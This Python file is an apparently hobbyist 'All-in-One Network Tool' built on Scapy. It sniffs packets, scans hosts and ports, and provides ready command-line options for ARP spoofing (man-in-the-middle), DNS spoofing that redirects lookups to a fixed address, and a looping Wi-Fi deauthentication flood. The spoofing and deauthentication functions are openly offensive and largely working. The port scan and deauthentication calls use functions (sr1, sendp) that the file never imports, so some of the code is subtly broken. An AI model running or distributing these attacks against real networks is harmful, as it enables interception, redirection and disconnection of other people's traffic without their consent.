import argparse
from scapy.all import sniff, ARP, Ether, srp, send, IP, ICMP, TCP, DNS, DNSQR, DNSRR, UDP, RadioTap, Dot11, Dot11Deauth
import os

#Linux is GOATED

# Helper: Sniff Network Traffic
def sniff_packets(count=10):
    def packet_handler(packet):
        print(packet.summary())
    sniff(prn=packet_handler, count=count)

# Helper: ARP Spoofing (MITM Attack)
def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    try:
        while True:
            send(packet, verbose=False)
            print(f"Sent ARP response: {target_ip} is-at {spoof_ip}")
    except KeyboardInterrupt:
        print("ARP Spoofing Stopped")

# Helper: DNS Spoofing
def dns_spoof(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata='1.2.3.4'))
        send(spoofed_pkt, verbose=False)
        print(f"Sent DNS Spoof: {packet[DNSQR].qname.decode()} -> 1.2.3.4")

# Helper: ARP Network Scan (Host Discovery)
def arp_scan(network):
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, unanswered = srp(arp_request_broadcast, timeout=2, verbose=False)
    
    for sent, received in answered:
        print(f"Host: {received.psrc} | MAC: {received.hwsrc}")

# Helper: TCP Port Scanning
def scan_ports(ip, ports):
    for port in ports:
        packet = IP(dst=ip) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            print(f"Port {port} is open")

# Helper: Wi-Fi Deauthentication Attack
def deauth(target_mac, gateway_mac, iface):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
    try:
        while True:
            sendp(packet, inter=0.1, count=100, iface=iface, verbose=0)
            print(f"Sent Deauth to {target_mac}")
    except KeyboardInterrupt:
        print("Deauth attack stopped.")

# Main Function: Command-line Interface
def main():
    parser = argparse.ArgumentParser(description="All-in-One Network Tool using Scapy")
    parser.add_argument("--sniff", action="store_true", help="Sniff network packets")
    parser.add_argument("--arp-spoof", nargs=2, metavar=('target_ip', 'spoof_ip'), help="Perform ARP Spoofing")
    parser.add_argument("--dns-spoof", action="store_true", help="Perform DNS Spoofing")
    parser.add_argument("--arp-scan", metavar="network", help="Perform ARP Scan for Host Discovery")
    parser.add_argument("--scan-ports", nargs=2, metavar=('target_ip', 'ports'), help="Perform TCP Port Scanning")
    parser.add_argument("--deauth", nargs=3, metavar=('target_mac', 'gateway_mac', 'iface'), help="Perform Wi-Fi Deauth Attack")

    args = parser.parse_args()

    if args.sniff:
        sniff_packets()
    elif args.arp_spoof:
        arp_spoof(args.arp_spoof[0], args.arp_spoof[1])
    elif args.dns_spoof:
        sniff(filter="udp port 53", prn=dns_spoof)
    elif args.arp_scan:
        arp_scan(args.arp_scan)
    elif args.scan_ports:
        target_ip = args.scan_ports[0]
        ports = [int(p) for p in args.scan_ports[1].split(',')]
        scan_ports(target_ip, ports)
    elif args.deauth:
        deauth(args.deauth[0], args.deauth[1], args.deauth[2])
    else:
        print("No valid option selected. Use --help for usage instructions.")

if __name__ == "__main__":
    main()
